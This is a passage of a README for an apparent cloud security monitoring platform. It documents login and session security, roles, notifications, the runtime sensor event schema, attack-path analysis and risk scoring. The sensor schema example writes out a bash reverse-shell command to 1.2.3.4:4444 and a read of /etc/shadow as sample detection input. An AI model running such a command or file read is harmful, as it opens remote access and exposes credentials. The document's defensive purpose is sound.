- `POST /api/auth/login`, the MFA second step (`/api/auth/login/mfa*`), `GET /api/auth/providers` and the Microsoft sign-in redirects (`/api/auth/sso/entra/*`),
- `POST /api/runtime/events`, which keeps its own `Authorization: Bearer <INGEST_API_TOKEN>` sensor authentication (user sessions are not accepted there).

The interactive API docs moved to `/api/docs` (`/api/openapi.json`), so they work through the frontend's `/api` proxy, and they also require sign-in unless `API_DOCS_PUBLIC=true`. `/docs` redirects there.

### MFA and Sign in with Microsoft

Users can protect their account with an authenticator app (TOTP) under **user menu → Security**; `MFA_REQUIRED_ROLES=admin,analyst` makes it mandatory for those roles, and admins can reset a user's MFA. Optionally, people sign in with **Microsoft Entra ID** (OIDC + PKCE, app-role/group → role mapping, optional just-in-time provisioning), and password login can be limited to break-glass accounts. Set `MFA_ENCRYPTION_KEY` (32+ chars) in production. Setup, all settings and the break-glass procedure: **[docs/AUTH.md](docs/AUTH.md)**.

### First sign-in (bootstrap admin)

No user and no password is ever seeded. Create the first admin in one of two ways:

1. **Environment variables**: set `ADMIN_EMAIL` and `ADMIN_PASSWORD` (12+ characters) before starting the backend. The admin is created at startup **only when the users table is empty**; afterwards the variables are ignored (you can, and should, remove `ADMIN_PASSWORD` once you have signed in and changed the password).
2. **CLI** (prompts for the password twice, so it never lands in shell history):

   ```bash
   cd backend
   python -m app.cli create-user --email you@example.com --name "Your Name" --role admin
   python -m app.cli reset-password --email you@example.com   # also unlocks and reactivates
   ```

   With Docker: `docker compose exec backend python -m app.cli create-user --email you@example.com --role admin`.

Then open the UI, sign in, and add other users under **Administration → Users**.

### Roles

| Role | Can |
|---|---|
| `viewer` | Read everything: dashboard, inventory, findings, vulnerabilities, threats, attack paths, connectors, scan history and schedule, IT assets (incl. CSV export) |
| `analyst` | Viewer, plus suppress / resolve / reopen findings, acknowledge / resolve alerts, run connector scans, edit IT assets (assign, return, offboard, dispose, certificates, CSV import), and view notification channels (masked), rules and the delivery log |
| `admin` | Everything, including user management (create, change role, deactivate, reset password), the audit log, connector settings, and notification channels / rules (test sends, retries) |

The UI hides or disables actions the signed-in role cannot perform; the API enforces the same rules (403). The last active admin cannot be demoted or deactivated.

### Passwords, lockout and rate limiting

- Passwords are hashed with **Argon2id** (`argon2-cffi`) and must be 12 to 256 characters.
- Failed sign-ins always return the same `Invalid email or password` message, and unknown or inactive accounts still run a dummy hash verification so response times do not reveal which emails exist.
- After `LOGIN_MAX_FAILURES` (5) consecutive wrong passwords an account is locked for `LOGIN_LOCKOUT_MINUTES` (15). Admins can unlock early with *Reset password*.
- Each client IP gets `LOGIN_RATE_LIMIT` (20) attempts per `LOGIN_RATE_WINDOW_SECONDS` (300); above that, login returns 429. The limiter is in-memory (single process, like the rest of the MVP). Behind a proxy (Vite dev server, nginx, Codespaces) every request comes from the proxy's address unless `TRUST_PROXY_HEADERS=true`, so the limit is then effectively shared by all clients; per-account lockout still applies individually.
- Changing your password signs out your other sessions; an admin password reset or deactivation signs out all of that user's sessions.

### Sessions and CSRF

- Sign-in creates a row in the server-side `user_sessions` table and sets a random 256-bit token in the `cnapp_session` cookie (`HttpOnly`, `SameSite=Lax`, `Path=/`, `Secure` unless `COOKIE_SECURE=false`). Only the SHA-256 of the token is stored.
- Sessions end after `SESSION_MAX_AGE_HOURS` (8 h, absolute) or `SESSION_IDLE_MINUTES` (30 min) without API activity. **Sign out** revokes the session server-side, so a copied cookie stops working.
- **CSRF** uses a synchronizer token: each session has its own random CSRF token, returned by `POST /api/auth/login` and `GET /api/auth/me` and kept in memory by the frontend (never in `localStorage`). Every `POST`/`PATCH`/`PUT`/`DELETE` authenticated by the cookie must send it in the `X-CSRF-Token` header, otherwise 403. A cross-site page cannot read the token, cannot send a custom header without a CORS preflight (which is not granted), and `SameSite=Lax` already keeps the cookie off cross-site sub-requests. `POST /api/auth/login` only accepts `application/json`, which a cross-site HTML form cannot send, to prevent login CSRF.
- When the session expires the UI returns to the sign-in page with a "session expired" notice and, after signing in, back to the page you were on. A 403 shows a "Not permitted" banner.

### Audit log

`audit_log` records sign-in success and failure (with the reason: unknown user, bad password, locked, inactive, rate limited), sign-out, password changes and resets, user creation and changes (with before/after values), the bootstrap admin, and analyst actions (finding and alert status changes, scans). Admins can browse it under **Administration → Audit log** or `GET /api/audit-log`.

### Session cookie settings

The browser only ever talks to the frontend origin: the Vite dev server (`npm run dev`) and the bundled nginx both proxy `/api` to the backend. The session cookie is therefore **same-origin** and no CORS or third-party-cookie setup is needed.

| How you open the UI | `COOKIE_SECURE` |
|---|---|
| `https://…` (production, GitHub Codespaces) | `true` (default) |
| `http://localhost:5173` | `true` works in Chrome, Edge and Firefox, which treat `localhost` as a secure context. If your browser drops the cookie (you get sent back to the sign-in page right after signing in), set `false` |
| `http://<some-ip-or-hostname>` (plain http, not localhost) | `false` (local testing only) |

If you serve the UI from a different origin than the API (not the default), add that origin to `CORS_ORIGINS`; credentials are allowed for listed origins (never for `*`).

### Running in GitHub Codespaces

1. In the codespace terminal, start the backend with a bootstrap admin:

   ```bash
   cd backend
   python -m venv .venv && source .venv/bin/activate
   pip install -r requirements-dev.txt
   ADMIN_EMAIL=you@example.com ADMIN_PASSWORD='choose-a-long-passphrase' \
     uvicorn app.main:app --reload --port 8000
   ```

2. In a second terminal, start the frontend:

   ```bash
   cd frontend
   npm ci
   npm run dev
   ```

   Codespaces opens forwarded ports as `https://<codespace>-5173.app.github.dev`. Vite rejects unknown `Host` headers, so the config allows `.app.github.dev` automatically when the `CODESPACES` env var is `true` (it is inside a codespace). Elsewhere, or if you have overridden it, start Vite with `__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=.app.github.dev npm run dev`.

3. Open the **5173** port from the *Ports* tab (you do not need to forward or expose 8000: Vite proxies `/api` to it inside the codespace) and sign in with `ADMIN_EMAIL` / `ADMIN_PASSWORD`.

Keep `COOKIE_SECURE=true` (the default): the browser sees the forwarded URL as https, so it stores the `Secure` cookie even though the hop from the Codespaces proxy to Vite and on to uvicorn is plain http. The cookie has no `Domain` attribute, so it is bound to your codespace's 5173 hostname only.

## Alert notifications

Send runtime alerts, posture findings, vulnerabilities, new attack paths,
scan results and endpoint device events (new posture issues, devices that stop
checking in, remote action results) to **Microsoft Teams** (Adaptive Cards), **Slack** (Block Kit),
**email** (SMTP with STARTTLS/TLS, or Azure Communication Services) and
**HMAC-signed webhooks**. Admins configure channels and routing rules under
**Notifications** (severity threshold, sources, subscriptions, tags, rule ids,
MITRE techniques; throttling per alert group, quiet hours, daily digests).

* Producers only queue an event row in their own transaction; a leader-elected
  background dispatcher (one sender across replicas) matches rules and delivers
  from a durable outbox with exponential-backoff retries and a dead-letter state,
  all visible in the delivery log.
* Channel secrets are encrypted with `NOTIFICATIONS_ENCRYPTION_KEY` and never
  returned by the API; outbound calls are SSRF-protected (https only, public IPs
  only with DNS pinning, no redirects, timeouts, size caps, host allowlists).
* Messages link back to the alert/finding via `PUBLIC_BASE_URL`.

Setup for each channel, the webhook signature format with Python and Node.js
verification code, and troubleshooting: **[docs/NOTIFICATIONS.md](docs/NOTIFICATIONS.md)**.

## Runtime sensor event schema

The runtime sensor in [`sensor/`](sensor/README.md) pushes events to `POST /api/runtime/events` with `Authorization: Bearer $INGEST_API_TOKEN`. The endpoint accepts a single event, a JSON array, or the sensor envelope `{"events": [...]}`, up to 1,000 events / 1 MiB. Both JSON schemas are at `GET /api/runtime/schema`.

**Native sensor schema v1.0** (default; see [`sensor/EVENT_SCHEMA.md`](sensor/EVENT_SCHEMA.md)) is recognised by its `schema_version` field. The backend:

- maps `network_connect`/`network_accept` to `network_connection` and `privilege_change` to `privilege_escalation`, and runs the same CDR rules as simulated events (plus CDR-009, a fallback for events the sensor marks `high`/`critical`);
- links events to inventory assets by Kubernetes pod name and namespace, then `cloud.resource_id` (ARM id), then VM name = `host`;
- de-duplicates on `event_id`, so sensor retries never double-count;
- uses `library_loaded` events to set the vulnerability **in use at runtime** flag (package and version match, with distro/soname aliases such as `libssl3` to `openssl`, and the binary packages of OSV-matched source packages) and re-scores risk. The flag expires if the sensor's hourly heartbeat stops for 3 hours. Events show up in the UI tagged `sensor`, next to `sim` events.

Every 6 hours the sensor also sends the host's **package inventory** (dpkg / apk / rpm and pip-installed Python packages) to `POST /api/runtime/packages` (same token; schema in [`sensor/EVENT_SCHEMA.md`](sensor/EVENT_SCHEMA.md#package-inventory)). The backend stores it on the host's asset (creating a sensor-backed `vm` asset for hosts that are not in a cloud inventory) and matches it with OSV.dev in the background ([docs/VULNERABILITIES.md](docs/VULNERABILITIES.md)).

**Legacy format** (used by the built-in simulator and the sensor's `cnapp-mvp` mode):

```jsonc
{
  "timestamp": "2026-10-14T12:00:00Z",          // optional; defaults to receipt time
  "asset_id": "/subscriptions/.../pods/web-1",  // inventory asset id (ARM id / pod id)
  "event_type": "process_exec",                 // process_exec | network_connection | file_access | privilege_escalation
  "sensor_id": "node-7-ebpf",
  "process":   {"name": "bash", "cmdline": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
                "pid": 4242, "ppid": 1, "parent_name": "java", "user": "app", "uid": 1000},
  "network":   {"direction": "outbound", "protocol": "tcp", "dst_ip": "1.2.3.4", "dst_port": 4444},
  "file":      {"path": "/etc/shadow", "operation": "read"},
  "privilege": {"from_uid": 1000, "to_uid": 0, "method": "setuid"},
  "container": {"id": "abc123", "name": "web", "image": "acr.io/web:1.2", "pod": "web-1", "namespace": "shop"},
  "labels":    {"node": "aks-node-7"}
}
```

Example:

```bash
curl -X POST localhost:8000/api/runtime/events \
  -H "Authorization: Bearer $INGEST_API_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"event_type":"network_connection","network":{"dst_ip":"185.220.101.47","dst_port":443}}'
```

The response lists the alerts triggered. Repeated hits of the same rule on the same asset within 30 minutes are grouped into one alert.

## Attack paths

The engine (`backend/app/engine/attack_paths.py`) walks the relationship graph from every internet-exposed asset over `contains`, `connects_to`, `uses_identity` and `has_access` edges (up to 6 hops) to assets holding sensitive data, and keeps the best path per entry point and target. The same logic applies to Azure, AWS and GCP. Each path is one of:

- **Confirmed** (`confirmed: true`): some hop carries an exploitable weakness:
  - an in-use vulnerability with CVSS ≥ 7 on a workload (VM, scale set, pod, function, EC2, GCE, ...);
  - a high/critical finding on the entry point or on a data store, or a sensitive data store that is itself internet-exposed;
  - a vulnerability-like finding on any hop: an **end-of-life runtime** (App Service) or database engine, e.g. *Vulnerable: Runtime PHP 7.4 is end-of-life since 2022-11-28*;
  - for the entry point: a high/critical inbound-exposure finding on a network control that `protects` it (Azure NSG on the NIC or subnet, AWS security group, GCP firewall rule), reported as e.g. *Exposed via NSG web-nsg: SSH (22) open to Internet*. The open ports are derived from the control's rules with the shared evaluator (`engine/nsg.py`: priority order, first match wins, Deny and Azure default rules, destination application security groups), the same one the posture rules use: Azure NIC- and subnet-level NSGs must **both** allow a port, controls at the same level (several security groups) are combined. Only risky ports count (SSH, RDP, WinRM, Telnet, SMB, common database ports, or all ports), and only if the internet can reach them: directly through a public IP, or, for a workload that is only behind a public load balancer, on the backend ports the load balancer forwards (an application gateway forwards HTTP(S) only, so it never confirms an SSH/RDP rule).
- **Exposure path** (`confirmed: false`, `note: "No exploitable weakness found yet"`): the chain exists but no weakness was found. The score is 60% of the normal score, capped at 54, so the severity is at most *medium*.

Confirmed paths are listed first. `GET /api/attack-paths` and `/api/attack-paths/graph` accept `confirmed_only=true`; the **Attack paths** page has a *Confirmed only / All exposure* switch, shows the weaknesses and the reason for every hop, and explains what is missing when there are no paths. New-path notifications and the dashboard's top risks only use confirmed paths; the dashboard also shows the number of exposure paths.

If the page is empty: there must be an internet-exposed entry point, a link from it to sensitive data (identity with data access), and, for a confirmed path, a weakness. The most common missing piece is sensitivity: tag storage accounts / buckets that hold sensitive data with `data_classification=confidential` and re-scan.

Entry points also include Azure Firewalls with DNAT rules (paths continue to the VM, scale set or private endpoint target), App Service apps that are reachable from the internet (access restrictions and public network access evaluated) and managed databases whose public endpoint admits every address. Private-only resources are never entry points.

Not covered yet: Azure Firewall network / application rules and NVA routing as an inbound path (route tables are informational), Application Gateway listener routing and WAF, per-instance (Flexible VMSS) NIC overrides, custom role permissions, App Service Environment reachability, and Key Vault access policies on RBAC-mode vaults (ignored by Azure too). See [docs/AZURE_COVERAGE.md](docs/AZURE_COVERAGE.md#remaining-limits).

## Cloud exposure

**Exposure** (`GET /api/exposure`, any signed-in user) lists every asset the internet can reach, across Azure, AWS and GCP:

- **Open** (any internet address) or **restricted** (only listed public ranges, shown with the CIDR, e.g. an NSG rule from an office range or a DNAT rule with a source list);
- **How**: public IP on a NIC, public load balancer rule / NAT, Application Gateway, Azure Firewall DNAT (with the public IP:port and translated target), PaaS public endpoint, App Service access-restriction state;
- **Effective ports** after NSG evaluation, **protecting controls** (NSGs per level, PaaS firewalls, access restrictions), **private endpoints**, outbound forced tunnelling;
- linked open **findings**, **vulnerabilities** and **attack paths**; whether the asset is an attack-path entry or reached through another one (e.g. the firewall).

Filters: cloud, subscription / account / project, asset type, port (`?port=22`), level. The dashboard has a **Cloud exposure** tile (`GET /api/exposure/summary`). AWS and GCP assets are described from their connector's exposure text and the ports their security groups / firewall rules open.

## Risk scoring

```
risk = 100 × (cvss/10) × runtime × context
runtime = 1.0 if the package is loaded at runtime, else 0.2
context = 0.4 + 0.25·internet_exposed + 0.20·exploit_available + 0.15·sensitive_data_access
```

A dormant vulnerability can never score above 20. An in-use, exposed vulnerability with CVSS ≥ 5 always scores at least 32.5, so it ranks above any dormant one. **Noise reduction** is the share of workload vulnerabilities in packages that are not loaded at runtime. `exploit_available` is set for CVEs in the CISA KEV catalog. Laptop vulnerabilities have no runtime sensor, so they are scored as in use (installed desktop apps are launched by users) without internet exposure, and are left out of the noise-reduction stat.

## Extending

- **New cloud provider**: implement `app/connectors/base.py::Connector` (`is_configured`, `collect`, `setup_hint`, `scope`) and register it in `app/connectors/__init__.py`. Normalize resources onto asset types and property names the posture rules understand, or add rules for new types; add workload / data / identity types to `app/engine/attack_paths.py`.
- **New posture rule**: add a function decorated with `@rule(...)` in `app/engine/posture.py` (Azure), `posture_aws.py` or `posture_gcp.py`.
- **New detection**: add a function decorated with `@detection(...)` in `app/engine/detection.py`.

## Security notes

- No secrets are committed. Only `.env.example` is tracked; `.env`, `*.pem`, `*.key` and local DB files are git-ignored.
- The Azure, AWS and GCP connectors are strictly read-only (Reader / SecurityAudit + ViewOnlyAccess / Viewer + Security Reviewer, plus a code-level guard each). The GCP key file is never stored in `cnapp.env`; on-prem it lives in `/opt/cnapp/secrets/gcp/` (0600, backend user) and is mounted read-only.
- Endpoint agents authenticate to `/api/agent/*` with per-device secrets (only SHA-256 stored), obtained with short-lived enrollment tokens; remote actions are allow-listed on the server and in the agent, need a reason and are audited ([details](docs/DEVICE_MANAGEMENT.md#security-model)).
- The sensor ingest endpoint requires a bearer token (`INGEST_API_TOKEN`) and is disabled when none is set. Request bodies are capped (`MAX_REQUEST_BYTES`) and every event field is length and range checked.
- Every other API endpoint requires a signed-in user with the right role (see [Authentication & access control](#authentication--access-control)): Argon2id passwords, server-side sessions in an `HttpOnly` / `SameSite=Lax` / `Secure` cookie, CSRF tokens on state-changing requests, account lockout, per-IP login rate limiting and an audit log.
- The Azure guard also blocks `list*`/`get*` operations that return secrets (`list_keys`, SAS tokens, AKS credentials).
- Do not commit the SQLite DB if you have run real scans; it contains your cloud inventory.

## Roadmap

- Wider eBPF coverage in the runtime sensor (file access attribution, accept/privilege events without polling).
- **DSPM**: data discovery and classification instead of tag-based sensitivity.
- **API security**: discovery of exposed APIs and runtime API traffic analysis.
- **CI/CD shift-left**: IaC scanning and image scanning in pipelines, linked to the runtime findings.
- SAML SSO and multi-tenancy; container image and cloud VM (agentless) vulnerability scanning; more CIS controls.

## Limitations (MVP)

- Vulnerability data and runtime events in simulated mode are synthetic. The Azure, AWS and GCP connectors cover posture only; real CVE data comes from the endpoint agent (laptops) and the runtime sensor's package inventory (Linux hosts). Container images are not scanned, and laptop software outside the curated CPE mapping is reported as "not checked" ([limits](docs/VULNERABILITIES.md#limits)).
- CIS control numbers are approximate mappings for illustration.
- On PostgreSQL the backend can run several replicas/workers (the simulator and scans use advisory-lock leader election), but the login rate limiter is in-memory: it resets on restart and counts per worker process, so the effective limit is `LOGIN_RATE_LIMIT` x workers x replicas. Per-account lockout is stored in the database and is exact.
- Single sign-on is Microsoft Entra ID (OIDC) only; no SAML or other identity providers yet.
- Device management covers inventory, posture, CVE matching of the OS and mapped software, and a few remote actions on Windows and macOS; no compliance policies or Linux endpoints yet (see [limitations](docs/DEVICE_MANAGEMENT.md#limitations)).
